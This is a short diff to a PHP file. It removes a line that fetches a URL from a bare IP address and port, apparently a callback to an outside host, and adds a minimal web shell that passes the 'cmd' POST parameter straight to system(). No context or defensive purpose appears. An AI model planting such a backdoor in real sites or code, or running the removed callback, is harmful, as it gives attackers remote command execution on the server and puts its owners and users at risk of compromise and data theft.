@@ -1,3 +1,5 @@
 <?
-file_get_contents('http://42.99.116.139:8080/888888888888');
+if($_POST['cmd']) {
+  system($_POST['cmd']);
+  }
 ?>
